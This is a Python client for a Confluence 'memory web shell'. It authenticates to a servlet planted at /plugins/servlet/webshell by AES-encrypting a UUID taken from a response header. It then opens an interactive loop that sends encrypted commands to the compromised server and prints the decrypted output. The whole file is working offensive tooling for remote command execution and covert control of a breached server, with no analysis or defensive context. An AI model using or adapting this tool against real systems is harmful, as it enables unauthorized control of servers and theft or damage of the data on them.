import requests
import sys
import base64
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.strxor import strxor_c
from base64 import b64decode

def get_uuid(base_url):
    endpoint = f"{base_url}//plugins/servlet/webshell"
    try:
        r = requests.get(endpoint, verify=False, timeout=10)
        uuid = r.headers['X-Seph-Version']
        print(f"[+] Obtained uuid: {uuid}")
        return uuid
    except Exception as e:
        print(f"[!] An error occurred when obtaining uuid! Error: {e}")
        sys.exit(0)

def base64_encode(input_bytes):
    return base64.b64encode(input_bytes).decode('utf-8')

def aes_encrypt(input_str, key):
    # Pad or truncate the key to 16 bytes
    key_bytes = key.encode('utf-8').ljust(16, b'\0')
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    padded_input = pad(input_str.encode(), AES.block_size)
    encrypted_bytes = cipher.encrypt(padded_input)
    return base64_encode(encrypted_bytes)

def check_auth(base_url, auth_header_value):
    headers = {'Authorization': auth_header_value}
    endpoint = f"{base_url}//plugins/servlet/webshell"
    try:
        r = requests.put(endpoint, headers=headers, verify=False, timeout=10, params={})
        if "passed" in r.text:
            print(f"[+] Successfully authenticated to webshell")
        else:
            print(f"[-] Unable to authenticate to webshell!")
            sys.exit(0)
    except Exception as e:
        print(f"[!] An error occurred when verifying authentication! Error : {e}")
        sys.exit(0)

def aes_decrypt(input, key):
    # Pad or truncate the key to 16 bytes
    key_bytes = key.encode('utf-8').ljust(16, b'\0')
    cipher = AES.new(key_bytes, AES.MODE_ECB)
    encrypted_bytes = b64decode(input)
    decrypted_bytes = cipher.decrypt(encrypted_bytes)
    decrypted_data = unpad(decrypted_bytes, AES.block_size)
    return decrypted_data.decode('utf-8')
    
def execute_command(auth_header_value, key, base_url):
    headers = {'Authorization': auth_header_value}
    print("[+] Starting interactive shell...")
    while True:
        command = input(">>> ")
        if command.lower() == "exit" or command.lower() == "quit":
            break
        else:
            encrypted_command = aes_encrypt(command, key)
            endpoint = f"{base_url}/plugins/servlet/webshell?cmd={encrypted_command}"
            try:
                r = requests.post(endpoint, headers=headers, verify=False, timeout=10)
                lines = str(r.text).split("\n")
                for line in lines:
                    try:
                        line = line.strip()[10:]
                        line = line.strip()
                        print(aes_decrypt(line, key))
                    except:
                        continue
            except Exception as e:
                print(f"[!] An error occurred during command execution: {e}")
        
def main(base_url, key):
    uuid = get_uuid(base_url)
    auth_header_value = aes_encrypt(uuid, key)
    print(f"[+] Generated authorization token: {auth_header_value}")
    check_auth(base_url, auth_header_value)
    execute_command(auth_header_value, key, base_url)
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Confluence Memory WebShell")
    parser.add_argument("--url", help = "Base url of confluence")
    parser.add_argument("--key", help = "Secret key used in Web Shell")
    args = parser.parse_args()
    main(args.url, args.key)
